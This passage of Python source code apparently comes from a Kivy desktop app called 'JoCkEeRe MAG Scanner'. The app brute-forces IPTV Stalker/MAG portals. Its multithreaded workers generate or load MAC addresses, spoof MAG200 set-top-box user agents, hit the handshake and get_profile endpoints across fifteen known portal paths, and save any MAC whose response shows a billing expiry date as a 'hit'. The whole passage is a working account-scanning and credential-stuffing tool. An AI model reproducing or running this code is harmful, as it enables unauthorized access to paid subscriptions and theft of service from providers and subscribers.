        self.start_btn.text             = "[b]▶  START SCAN[/b]"
        self.start_btn.background_color = BTN_SCAN
        self.pause_btn.disabled         = True
        self.pause_btn.text             = "[b]⏸  PAUSE[/b]"
        self.status_dot.text            = "● IDLE"
        self.status_dot.color           = C_GRAY
        self.add_log("Scan stopped.")

    def toggle_pause(self, *a):
        if self.paused:
            self.paused = False
            self.pause_event.set()
            self.pause_btn.text             = "[b]⏸  PAUSE[/b]"
            self.pause_btn.background_color = BTN_PAUSE
            self.status_dot.text            = "● RUNNING"
            self.status_dot.color           = C_GREEN
        else:
            self.paused = True
            self.pause_event.clear()
            self.pause_btn.text             = "[b]▶  RESUME[/b]"
            self.pause_btn.background_color = BTN_GREEN
            self.status_dot.text            = "● PAUSED"
            self.status_dot.color           = C_YELLOW

    def start_scan(self):
        self.panel_host = self.panel_input.text.strip()
        if not self.panel_host:
            self.add_log("ERROR: Enter Panel:Port", error=True)
            return

        self.panel_host   = self.panel_host.replace("http://","").replace("/c","").rstrip("/")
        self.panel_choice = str(self.panel_type_spinner.values.index(
                                self.panel_type_spinner.text) + 1)
        try:
            self.bots = max(1, int(self.bots_input.text))
        except:
            self.bots = 4

        self.output_mode = str(self.output_spinner.values.index(
                                self.output_spinner.text))
        self.dsyno = "1" if "Combo" in self.mode_spinner.text else "0"

        if self.dsyno == "0":
            self.mac_prefix  = self.prefix_spinner.text
            try:
                self.total_macs = max(1, int(self.mac_count_input.text))
            except:
                self.total_macs = 30000
            self.combo_data = None
        else:
            if not self.mac_list:
                self.add_log("ERROR: Load combo file first", error=True)
                return
            self.total_macs = len(self.mac_list)
            self.combo_data = self.mac_list[:]

        self._setup_panel_params()
        self.save_settings()

        self.hits = self.checked = 0
        self.running = True
        self.paused  = False
        self.stop_event.clear()
        self.pause_event.set()
        self.start_time = time.time()
        self.worker_threads = []

        self.start_btn.text             = "[b]⏹  STOP SCAN[/b]"
        self.start_btn.background_color = BTN_STOP
        self.pause_btn.disabled         = False
        self.status_dot.text            = "● RUNNING"
        self.status_dot.color           = C_GREEN

        for s in [self.stat_checked, self.stat_hits,
                  self.stat_speed, self.stat_pct]:
            s.set("0")
        self.stat_time.set("00:00")

        self.add_log(f"Started  |  {self.panel_host}  |  Bots: {self.bots}")

        mac_iter = iter(self.combo_data) if self.combo_data else None
        mac_lock = threading.Lock()
        for _ in range(self.bots):
            t = threading.Thread(target=self.worker,
                                  args=(mac_iter, mac_lock), daemon=True)
            t.start()
            self.worker_threads.append(t)

        Clock.schedule_interval(self.update_timer, 1)

    def _setup_panel_params(self):
        c  = self.panel_choice
        ua = ("Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 "
              "(KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3")
        ua2 = ("Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 "
               "(KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3")
        self.useragent = ua
        self.buri = "/c/"; self.uzmanc = ""
        mapping = {
            "1":  ("portal.php", ua,  ""),
            "2":  ("portal.php", ua2, "ultra"),
            "3":  ("portal.php", ua2, "realblue"),
            "4":  ("server/load.php", ua, ""),
            "5":  ("stalker_portal/server/load.php", ua, "stalker"),
            "6":  ("c/server/load.php", ua, ""),
            "7":  ("c/portal.php", ua, ""),
            "8":  ("bs.msg/portal.php", ua, ""),
            "9":  ("magload.php", ua, ""),
            "10": ("portalstb/portal.php", ua, ""),
            "11": ("k/portal.php", ua, ""),
            "12": ("maglove/portal.php", ua, ""),
            "13": ("magaccess/portal.php", ua, ""),
            "14": ("portalmega.php", ua, ""),
            "15": ("portal.php", ua, "powerfull"),
        }
        if c in mapping:
            self.uzmanm, self.useragent, self.uzmanc = mapping[c]
        self.urib = "/stalker_portal" if c == "5" else ""

    # ──────── WORKER ────────
    def worker(self, mac_iter, mac_lock):
        panel = self.panel_host
        count = 0
        while self.running:
            self.pause_event.wait()
            if not self.running:
                break
            with mac_lock:
                if mac_iter:
                    try:
                        macs = next(mac_iter)
                    except StopIteration:
                        break
                    count += 1
                    if count > self.total_macs:
                        break
                else:
                    if self.checked >= self.total_macs:
                        break
                    macs = randommac(self.mac_prefix)

            self.update_queue.put(('mac', macs))
            try:
                token_url = (f"http://{panel}{self.urib}/{self.uzmanm}"
                             f"?action=handshake&type=stb&token=&JsHttpRequest=1-xml")
                r1    = ses.get(token_url, headers=hea1(macs, self.useragent, panel),
                                timeout=8, verify=False)
                try:    token = r1.json()['js']['token']
                except: token = ""

                profile_url = (f"http://{panel}{self.urib}/{self.uzmanm}"
                               f"?action=get_profile&type=stb&JsHttpRequest=1-xml")
                r2   = ses.get(profile_url, headers=hea2(macs, token, self.useragent, panel),
                               timeout=8, verify=False)
                veri = r2.text
                self.update_queue.put(('checked', 1))

                expiry = 0
                if "expire_billing_date" in veri:
                    try:
                        raw = veri.split('expire_billing_date":"')[1].split('"')[0]
                        expiry = tarih_clear(raw)
                    except:
                        pass

                if expiry > 0 or "expire_billing_date" in veri:
                    hit = (f"\n{'='*44}\n"
                           f"  🎯 HIT  |  {nickn}\n"
                           f"{'='*44}\n"
                           f"  Panel  : {panel}\n"
                           f"  MAC    : {macs}\n"
                           f"  Expiry : {expiry} days\n"
                           f"{'='*44}")
                    save_hit(hit, panel)
                    self.update_queue.put(('hit', hit))
            except:
                self.update_queue.put(('checked', 1))

        self.update_queue.put(('done', None))

    # ──────── QUEUE / TIMER ────────
    def process_queue(self, dt):
        done = 0
        while not self.update_queue.empty():
            try:
                kind, val = self.update_queue.get_nowait()
            except:
                break
            if kind == 'checked':
                self.checked += val
                self.stat_checked.set(str(self.checked))
                pct = (self.checked / self.total_macs * 100) if self.total_macs else 0
                self.stat_pct.set(f"{pct:.1f}")
            elif kind == 'hit':
                self.hits += 1
                self.stat_hits.set(str(self.hits))
                self.add_log(val, hit=True)
            elif kind == 'mac':
                self.current_mac.text = val
            elif kind == 'done':
                done += 1
        if done >= self.bots and self.running:
            self.stop_scan()

    def update_timer(self, dt):
        if not self.running:
            return False
        e    = int(time.time() - self.start_time)
        h, r = divmod(e, 3600)
        m, s = divmod(r, 60)
        self.stat_time.set(f"{h:02d}:{m:02d}:{s:02d}" if h else f"{m:02d}:{s:02d}")
        spd = self.checked / e if e > 0 else 0
        self.stat_speed.set(f"{spd:.1f}")


# ==================== App ====================
class JoCkEeReApp(App):
    def build(self):
        self.title = "JoCkEeRe MAG Scanner"
        Window.clearcolor = BG_DARK
        return ScannerLayout()

if __name__ == "__main__":
    JoCkEeReApp().run()
